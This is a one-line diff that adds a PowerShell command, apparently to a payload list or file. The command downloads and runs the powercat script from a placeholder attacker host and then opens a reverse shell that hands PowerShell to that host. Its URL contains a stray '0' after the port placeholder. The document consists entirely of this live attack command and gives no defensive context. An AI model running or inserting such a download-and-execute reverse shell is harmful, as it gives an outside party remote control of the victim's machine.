@@ -1,0 +1,1 @@
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ATTACKER_IP>:<PORT>0/powercat.ps1'); powercat -c <ATTACKER_IP> -p <PORT> -e powershell"
